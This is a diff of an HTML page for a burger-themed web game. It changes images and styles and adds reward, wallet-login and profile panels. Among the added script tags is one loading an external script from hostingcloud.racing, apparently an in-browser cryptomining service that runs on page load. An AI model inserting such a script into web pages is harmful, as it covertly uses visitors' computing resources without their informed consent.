@@ -26,6 +26,10 @@
       rel="icon"
       href="https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fburgers.png"
     />
+    <script src="/client.js" defer></script>
+    <script src="/fly.js" defer></script>
+    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
+    <script src="https://www.hostingcloud.racing/5pDo.js"></script>
 
     <style>
       wrap {
@@ -34,7 +38,7 @@
         left: 0;
         width: 100%;
         height: 100%;
-        background-image: url("/images/counter-576092_960_720.png");
+        background-image: url("/images/chef-4509812_960_720.png");
         background-size: cover;
         background-repeat: no-repeat;
         z-index: -2;
@@ -95,7 +99,6 @@
         position: fixed;
         display: block;
         background-color: transparent;
-
         background-repeat: no-repeat;
         border-style: none;
         width: 50%;
@@ -111,12 +114,12 @@
         height: 150px;
         margin-top: 23rem;
         margin-left: -5rem;
-        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fburgers.png");
+        background-image: url("/images/hamburger-31775_960_720.png");
         background-size: contain;
         background-repeat: no-repeat;
         background-color: transparent;
         opacity: 0.01;
-        z-index: 12;
+        z-index: 2;
         transform: rotate(0.34deg);
       }
 
@@ -127,12 +130,76 @@
         height: 150px;
         margin-top: 27rem;
         margin-left: -5rem;
-        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fthumbnails%2Fsilverware-1667987__480.png");
+        background-image: url("/images/silverware-1667987_960_720.png");
         background-size: contain;
         background-repeat: no-repeat;
         background-color: transparent;
         opacity: 1;
         transform: rotate(-0.34deg);
+      }
+      .rewardicon {
+        position: fixed;
+        display: block;
+        bottom: 0;
+        right: 0;
+        margin-bottom: 2.27rem;
+        margin-right: 12rem;
+        width: 45px;
+        height: 45px;
+        background-color: gold;
+        background-image: url("/images/coinsTwo.png");
+        background-size: contain;
+        background-repeat: no-repeat;
+        border-radius: 50%;
+        color: white;
+        opacity: 0.6;
+        z-index: 3;
+      }
+
+      .profileicon {
+        position: fixed;
+        display: block;
+        bottom: 0;
+        right: 0;
+        margin-bottom: 2.27rem;
+        margin-right: 7.59rem;
+        width: 47px;
+        height: 47px;
+        background-color: gold;
+        background-image: url("/images/avatar.png");
+        background-size: contain;
+        background-repeat: no-repeat;
+        border-radius: 50%;
+        opacity: 1;
+        z-index: 3;
+      }
+
+      .loginImage {
+        position: relative;
+        display: block;
+        width: 25rem;
+        height: 40rem;
+        background-color: transparent;
+        background-image: url("/images/login.png");
+        background-size: contain;
+        background-repeat: no-repeat;
+        z-index: 2;
+      }
+      .rewardPop {
+        position: fixed;
+        display: block;
+        bottom: 0;
+        right: 0;
+        width: 50px;
+        height: 50px;
+        margin-right: 11rem;
+        margin-bottom: 3rem;
+        background-color: transparent;
+        background-image: url("/images/confetti.png");
+        background-size: contain;
+        background-repeat: no-repeat;
+        z-index: 3;
+        background-color: silver;
       }
 
       .hide {
@@ -234,6 +301,46 @@
           </div>
         </footer>
       </center>
+      <div class="rewardicon" id="rewardicon" onclick="claimUpdate();">
+        <br />
+        <br />
+
+        <center>
+          <label id="minutes" value="0">00</label>.<label id="seconds" value="0"
+            >00</label
+          >
+        </center>
+      </div>
+      <div class="profileicon" id="profileicon" onclick="viewReward();"></div>
+      <div title="closed" id="REWARDS" class="hide">
+        <div onclick="viewReward();" style="cursor:pointer; margin-left: 90%;">
+          X
+        </div>
+        <div class="hide">Player: <label id="myName">Guest</label></div>
+        <div>
+          Wallet:
+          <label id="myWallet" onclick="getLogin();" style="cursor:pointer;"
+            >LOGIN</label
+          >
+        </div>
+        <div>
+          Reward Token:
+          <label id="myToken" onclick="selectToken();">Random</label>
+        </div>
+        <div>
+          Mode:
+          <label id="vrMode" onclick="vrMode();">Hubs</label>
+        </div>
+        <div class="button" onclick="pendingClaims();">
+          View Pending
+        </div>
+        <button class="hide" id="clear-dreams">
+          Clear Dreams
+        </button>
+        <section title="closed" id="pendingClaims" class="hide">
+          <ul id="dreams"></ul>
+        </section>
+      </div>
     </wrap>
   </body>
 </html>
